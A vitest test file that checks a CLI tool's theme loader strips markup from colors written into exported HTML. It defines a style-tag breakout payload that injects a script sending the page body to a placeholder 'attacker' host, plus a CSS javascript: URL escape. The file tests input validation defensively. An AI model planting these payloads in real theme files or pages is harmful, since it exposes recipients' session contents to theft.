import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { ENV_AGENT_DIR } from "../src/config.ts";
import { getResolvedThemeColors, getThemeExportColors } from "../src/modes/interactive/theme/theme.ts";

/**
 * Theme colors are written raw into the exported document's `<style>` block:
 *
 *     :root { --accent: <value>; }
 *
 * A theme file is user- and project-supplied (a trusted project can ship
 * `.disco/themes/*.json`), and the exported HTML is normally handed to other
 * people — so a value that is not a plain CSS color closes `</style>` and runs
 * script in the recipient's browser, with the whole session readable from the
 * page. Every value that reaches that block must therefore be markup-free.
 */

const BREAKOUT = "#</style><script>fetch('https://attacker/?d='+btoa(document.body.innerHTML))</script><style>";
// A value only reaches the style block if it starts with "#" (anything else is
// read as a variable reference), so a CSS-escape payload must be "#"-prefixed.
const CSS_ESCAPE = "#000;background-image:url(javascript:alert(1))";

type ThemeFile = {
	name: string;
	vars?: Record<string, string | number>;
	colors: Record<string, string | number>;
	export?: { pageBg?: string | number; cardBg?: string | number; infoBg?: string | number };
};

describe("theme colors in the exported CSS", () => {
	let tempRoot: string;
	let previousAgentDir: string | undefined;

	beforeEach(() => {
		tempRoot = mkdtempSync(join(tmpdir(), "disco-theme-css-"));
		previousAgentDir = process.env[ENV_AGENT_DIR];
		process.env[ENV_AGENT_DIR] = join(tempRoot, "agent");
		mkdirSync(join(process.env[ENV_AGENT_DIR]!, "themes"), { recursive: true });
	});

	afterEach(() => {
		rmSync(tempRoot, { recursive: true, force: true });
		if (previousAgentDir === undefined) {
			delete process.env[ENV_AGENT_DIR];
		} else {
			process.env[ENV_AGENT_DIR] = previousAgentDir;
		}
	});

	function writeTheme(name: string, theme: ThemeFile): void {
		writeFileSync(join(process.env[ENV_AGENT_DIR]!, "themes", `${name}.json`), JSON.stringify(theme), "utf-8");
	}

	function baseTheme(overrides: Partial<ThemeFile>): ThemeFile {
		const dark = JSON.parse(
			readFileSync(new URL("../src/modes/interactive/theme/dark.json", import.meta.url), "utf-8"),
		) as ThemeFile;
		// Every color key is required by the loader, so merge onto the built-in
		// theme rather than replacing `colors` outright.
		return {
			...dark,
			name: "evil",
			...overrides,
			colors: { ...dark.colors, ...overrides.colors },
			vars: { ...dark.vars, ...overrides.vars },
		};
	}

	it("rejects a color that would close the style block", () => {
		writeTheme("evil", baseTheme({ colors: { accent: BREAKOUT } }));

		const colors = getResolvedThemeColors("evil");
		expect(colors.accent).not.toContain("</style>");
		expect(colors.accent).not.toContain("<script>");
	});

	it("rejects a color that breaks out of the declaration", () => {
		writeTheme("evil", baseTheme({ colors: { accent: CSS_ESCAPE } }));

		expect(getResolvedThemeColors("evil").accent).not.toContain("javascript:");
		expect(getResolvedThemeColors("evil").accent).not.toContain(";");
	});

	it("rejects a hostile value reached through a variable reference", () => {
		// `vars` are indirection: a color can name a var whose value is the payload.
		writeTheme("evil", baseTheme({ vars: { payload: BREAKOUT }, colors: { accent: "payload" } }));

		expect(getResolvedThemeColors("evil").accent).not.toContain("</style>");
	});

	it("rejects a hostile export background", () => {
		writeTheme("evil", baseTheme({ export: { pageBg: BREAKOUT, cardBg: CSS_ESCAPE } }));

		const exported = getThemeExportColors("evil");
		expect(exported.pageBg).toBeUndefined();
		expect(exported.cardBg).toBeUndefined();
	});

	it("still accepts every color form the theme format supports", () => {
		// resolveVarRefs treats any non-empty string that does not start with "#"
		// as a variable reference, so hex is the only literal color form a theme
		// can express — rgb()/hsl()/named colors are rejected by the loader before
		// validation is reached.
		writeTheme(
			"evil",
			baseTheme({
				colors: { accent: "#ff8800", border: "#fff", text: "#abcdef" },
				export: { pageBg: "#101010", cardBg: "#202020" },
			}),
		);

		const colors = getResolvedThemeColors("evil");
		expect(colors.accent).toBe("#ff8800");
		expect(colors.border).toBe("#fff");
		expect(colors.text).toBe("#abcdef");

		const exported = getThemeExportColors("evil");
		expect(exported.pageBg).toBe("#101010");
		expect(exported.cardBg).toBe("#202020");
	});

	it("emits only markup-free values for the built-in themes", () => {
		for (const name of ["dark", "light"]) {
			for (const [key, value] of Object.entries(getResolvedThemeColors(name))) {
				expect(value, `${name}.${key}`).toMatch(/^(?:#[0-9a-fA-F]{3,8}|(?:rgb|rgba|hsl|hsla)\([0-9.,%/\s]+\)|[A-Za-z]+)$/);
			}
		}
	});
});
